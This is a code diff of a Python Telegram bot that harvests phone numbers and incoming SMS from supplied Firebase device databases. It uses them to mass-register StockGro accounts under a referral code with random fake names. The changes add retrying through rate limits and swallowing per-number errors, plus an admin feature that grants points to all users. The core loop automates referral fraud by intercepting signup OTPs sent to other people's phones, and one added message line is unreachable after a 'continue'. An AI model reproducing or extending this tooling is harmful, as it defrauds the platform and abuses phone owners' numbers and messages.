@@ -805,38 +805,14 @@ def checker_report(fb_url: str, fb_key: str, proxy: str | None = None) -> str:
     devices, order, panel = collect_numbers(fb_url, fb_key, proxy, clients)
     online = sum(1 for d in devices if d["online"] is True)
     unknown = sum(1 for d in devices if d["online"] is None)
-    reg = sum(1 for ph, info in panel.items() if info.get("registered") is True)
     lines = [f"*FIREBASE CHECK*\n------------------------",
              f"Host: `{fb_host(fb_url)}`",
-             f"Key: {'provided' if fb_key else 'not provided (public access)'}",
              "Status: *ACTIVE*",
-             f"Devices: *{len(devices)}* (Online: *{online}*" +
-             (f", Unknown: *{unknown}*" if unknown else "") + ")",
-             f"Panel numbers: *{len(panel)}*" + (f" (registered: *{reg}*)" if reg else ""),
-             f"Numbers found: *{len(order)}*",
-             ""]
-    shown = 0
-    for ph, info in panel.items():
-        if shown >= 15:
-            break
-        flag = " (registered)" if info.get("registered") is True else ""
-        lines.append(f"📱 `{ph}`{flag}")
-        shown += 1
-    if len(panel) > 15:
-        lines.append(f"...and {len(panel) - 15} more panel numbers")
-    if shown:
-        lines.append("")
-    for d in devices[:10]:
-        short = d["id"][:10]
-        prim = f"`{d['primary']}`" if d["primary"] else "-"
-        extra = f" +{len(d['sms'])} sms" if d["sms"] else ""
-        dot = "🟢" if d["online"] is True else ("🔴" if d["online"] is False else "⚪")
-        lines.append(f"{dot} `{short}` | {prim}{extra}")
-    if len(devices) > 10:
-        lines.append(f"...and {len(devices) - 10} more devices")
-    fresh = sum(1 for ph, _ in order if not is_number_used(ph))
-    lines += ["", f"Fresh (unused) numbers: *{fresh}*",
-              "Submit this Firebase with the Submit button to start auto refers."]
+             f"Devices: *{len(devices)}*",
+             f"Online: *{online}*" + (f" (Unknown: *{unknown}*)" if unknown else ""),
+             f"Numbers: *{len(order)}*",
+             "",
+             "Submit this Firebase with the Submit button to start auto refers."]
     return "\n".join(lines)
 
 
@@ -873,56 +849,84 @@ def run_firebase_job(bot, loop, chat_id: int, uid: int, fb_url: str, fb_key: str
         return
     say(f"Found *{len(fresh)}* fresh number(s). Starting auto refers.")
     tried, success = 0, []
+    rl_hits = 0
+
     for ph, dev_id in fresh:
-        tried += 1
-        name = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
-        d, _st, err = call_with_state(
-            lambda st: sg_post(f"{BASE_URL}/getIdentity",
-                               {"phone_number": ph, "country_code": "IN", "otp_channel": "sms"},
-                               build_headers(st), proxy), proxy)
-        if err or not d or not d.get("success"):
-            if d and is_rate_limited(d):
-                say("*Rate limited by StockGro.* Stopping this job. No points lost beyond the entry fee. Try later.")
-                break
+        try:
+            tried += 1
+            name = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
+            d, _st, err = call_with_state(
+                lambda st: sg_post(f"{BASE_URL}/getIdentity",
+                                   {"phone_number": ph, "country_code": "IN", "otp_channel": "sms"},
+                                   build_headers(st), proxy), proxy)
+            if err or not d or not d.get("success"):
+                if d and is_rate_limited(d):
+                    rl_hits += 1
+                    if rl_hits > 3:
+                        say("*Rate limit keeps hitting.* Stopping here to protect the server. "
+                            "Resubmit later for the remaining numbers.")
+                        break
+                    say("*Rate limited.* Waiting 60s, then continuing with the next number.")
+                    time.sleep(60)
+                continue
+            if d["data"].get("existing_user"):
+                save_success(ph, uid, "ALREADY_REGISTERED", "-", refcode)
+                continue
+            last_key = get_last_message_key(fb_url, fb_key, dev_id, proxy) if dev_id else ""
+            time.sleep(2)
+            dc, sdata, derr = call_with_state(
+                lambda st: sg_post(f"{BASE_URL}/login/createOtp",
+                                   {"phone_number": ph, "country_code": "IN", "otp_channel": "sms",
+                                    "invitation_code": refcode, "flow_type": "signup"},
+                                   build_headers(st)), proxy)
+            if derr or not dc or not dc.get("success"):
+                if dc and is_rate_limited(dc):
+                    rl_hits += 1
+                    if rl_hits > 3:
+                        say("*Rate limit keeps hitting.* Stopping here. Resubmit later for the rest.")
+                        break
+                    say("*Rate limited.* Waiting 60s, then continuing with the next number.")
+                    time.sleep(60)
+                continue
+                say(f"SMS sent to `{ph}`. Waiting for auto OTP (up to {OTP_TIMEOUT}s).")
+            otp = poll_otp_numbers_node(fb_url, fb_key, ph, proxy, OTP_TIMEOUT)
+            if not otp and dev_id:
+                otp = poll_for_stockgro_otp(fb_url, fb_key, dev_id, last_key, proxy, OTP_TIMEOUT)
+            if not otp:
+                continue
+            # Fresh state for validate+register (real file does the same:
+            # the old state expires during the OTP wait -> CLIENT_STATE_EXPIRE).
+            vheaders = build_headers(sdata.get("state", ""))
+            try:
+                vstate, verr = get_server_state(force=True, proxy=proxy)
+                if vstate:
+                    vheaders = build_headers(vstate)
+                    sg_post(f"{BASE_URL}/getIdentity",
+                            {"phone_number": ph, "country_code": "IN", "otp_channel": "sms"},
+                            vheaders, proxy)
+            except Exception as e:
+                log.warning("validate state refresh fail: %s", e)
+            v = sg_post(f"{BASE_URL}/login/validateOtp",
+                        {"session_id": sdata["session_id"], "otp": otp, "phone_number": ph,
+                         "country_code": "IN", "otp_channel": "sms", "flow_type": "signup"},
+                        vheaders, proxy)
+            if not v or not v.get("success"):
+                continue
+            r = sg_post(f"{BASE_URL}/signup/registerUser",
+                        {"display_name": name, "invitation_code": refcode, "otp": otp,
+                         "session_id": sdata["session_id"], "whatsapp_consent": True,
+                         "phone_number": ph, "country_code": "IN", "otp_channel": "sms"},
+                        vheaders, proxy)
+            if not r or not r.get("success"):
+                continue
+            sg_uid = r.get("data", {}).get("user_id", "")
+            save_success(ph, uid, name, sg_uid, refcode)
+            success.append((ph, name))
+            say(f"*Success {len(success)}:* `{ph}` registered as *{name}*.")
+        except Exception as e:
+            # one bad number must never kill the whole job
+            log.warning("job number %s failed: %s", ph, str(e)[:200])
             continue
-        if d["data"].get("existing_user"):
-            save_success(ph, uid, "ALREADY_REGISTERED", "-", refcode)
-            continue
-        last_key = get_last_message_key(fb_url, fb_key, dev_id, proxy) if dev_id else ""
-        time.sleep(2)
-        dc, sdata, derr = call_with_state(
-            lambda st: sg_post(f"{BASE_URL}/login/createOtp",
-                               {"phone_number": ph, "country_code": "IN", "otp_channel": "sms",
-                                "invitation_code": refcode, "flow_type": "signup"},
-                               build_headers(st)), proxy)
-        if derr or not dc or not dc.get("success"):
-            if dc and is_rate_limited(dc):
-                say("*Rate limited by StockGro.* Stopping this job. Try later.")
-                break
-            continue
-        say(f"SMS sent to `{ph}`. Waiting for auto OTP (up to {OTP_TIMEOUT}s).")
-        otp = poll_otp_numbers_node(fb_url, fb_key, ph, proxy, OTP_TIMEOUT)
-        if not otp and dev_id:
-            otp = poll_for_stockgro_otp(fb_url, fb_key, dev_id, last_key, proxy, OTP_TIMEOUT)
-        if not otp:
-            continue
-        v = sg_post(f"{BASE_URL}/login/validateOtp",
-                    {"session_id": sdata["session_id"], "otp": otp, "phone_number": ph,
-                     "country_code": "IN", "otp_channel": "sms", "flow_type": "signup"},
-                    build_headers(sdata.get("state", "")), proxy)
-        if not v or not v.get("success"):
-            continue
-        r = sg_post(f"{BASE_URL}/signup/registerUser",
-                    {"display_name": name, "invitation_code": refcode, "otp": otp,
-                     "session_id": sdata["session_id"], "whatsapp_consent": True,
-                     "phone_number": ph, "country_code": "IN", "otp_channel": "sms"},
-                    build_headers(sdata.get("state", "")), proxy)
-        if not r or not r.get("success"):
-            continue
-        sg_uid = r.get("data", {}).get("user_id", "")
-        save_success(ph, uid, name, sg_uid, refcode)
-        success.append((ph, name))
-        say(f"*Success {len(success)}:* `{ph}` registered as *{name}*.")
     record_job(uid, host, tried, len(success), "done")
     u = get_user(uid)
     bal = u["points"] if u else 0
@@ -1307,7 +1311,9 @@ async def show_admin(q_or_msg, context):
                               style=STYLE_PRIMARY, icon_custom_emoji_id=ICON_BLUE),
          InlineKeyboardButton("📣 Broadcast", callback_data="a_bcast",
                               style=STYLE_DANGER, icon_custom_emoji_id=ICON_CANCEL)],
-        [InlineKeyboardButton("🔙 Back", callback_data="m_back")],
+        [InlineKeyboardButton("🎁 Bonus All", callback_data="a_bonusall",
+                              style=STYLE_SUCCESS, icon_custom_emoji_id=ICON_GREEN),
+         InlineKeyboardButton("🔙 Back", callback_data="m_back")],
     ])
     if hasattr(q_or_msg, "edit_message_text"):
         await safe_edit(q_or_msg, text, parse_mode="Markdown", reply_markup=kb)
@@ -1364,6 +1370,12 @@ async def on_admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["awaiting"] = "admin_search"
         await safe_edit(q, "Please send the *User ID* to search.\nSend /cancel to cancel.",
                         parse_mode="Markdown")
+    elif data == "a_bonusall":
+        context.user_data["awaiting"] = "admin_bonusall_amt"
+        context.user_data.pop("bonus_pts", None)
+        await safe_edit(q, "How many points to give to *ALL* users?\nSend a number (e.g. `5`).\n"
+                           "Send /cancel to cancel.",
+                        parse_mode="Markdown")
     elif data == "a_bcast":
         context.user_data["awaiting"] = "admin_bcast"
         await safe_edit(q, "Please send the broadcast message (it will go to all users):",
@@ -1419,6 +1431,43 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = context.user_data.get("awaiting")
 
     # ---------- ADMIN states ----------
+    if state == "admin_bonusall_amt" and is_admin(uid):
+        try:
+            pts = int(text.split()[0])
+        except (ValueError, IndexError):
+            await update.message.reply_text("Please send a valid number (e.g. `5`).",
+                                            parse_mode="Markdown")
+            return
+        if pts <= 0 or pts > 100000:
+            await update.message.reply_text("Points must be between 1 and 100000.",
+                                            parse_mode="Markdown")
+            return
+        con = db()
+        n = con.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
+        con.close()
+        context.user_data["bonus_pts"] = pts
+        context.user_data["awaiting"] = "admin_bonusall_ok"
+        await update.message.reply_text(
+            f"This will give *{pts}* points to *{n}* users (total *{pts * n}* points).\n"
+            "Send *YES* to confirm, or /cancel to stop.",
+            parse_mode="Markdown")
+        return
+    if state == "admin_bonusall_ok" and is_admin(uid):
+        if text.strip().upper() != "YES":
+            context.user_data.pop("awaiting", None)
+            context.user_data.pop("bonus_pts", None)
+            await update.message.reply_text("Cancelled. Send *YES* to confirm or /cancel.")
+            return
+        pts = context.user_data.pop("bonus_pts", 0)
+        context.user_data.pop("awaiting", None)
+        if not pts:
+            await update.message.reply_text("Cancelled.")
+            return
+        wait = await update.message.reply_text("Adding bonus points to all users. Please wait.")
+        done = await asyncio.to_thread(bonus_all_users, pts)
+        await wait.edit_text(f"*Bonus completed.*\n*{pts}* points given to *{done}* users.",
+                             parse_mode="Markdown")
+        return
     if state == "admin_addchannel" and is_admin(uid):
         parts = text.split()
         raw = parts[0]
@@ -1591,6 +1640,17 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text("Please select an option from the menu.",
                                     reply_markup=main_menu_kb(is_admin(uid)))
+
+
+def bonus_all_users(pts: int) -> int:
+    """Add the same points to EVERY user. Returns number of users updated."""
+    con = db()
+    con.execute("UPDATE users SET points = points + ?", (pts,))
+    n = con.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
+    con.commit()
+    con.close()
+    log.info("bonus-all: +%s pts to %s users", pts, n)
+    return n
 
 
 def give_points(target_id: int, pts: int) -> tuple[bool, int | None]:
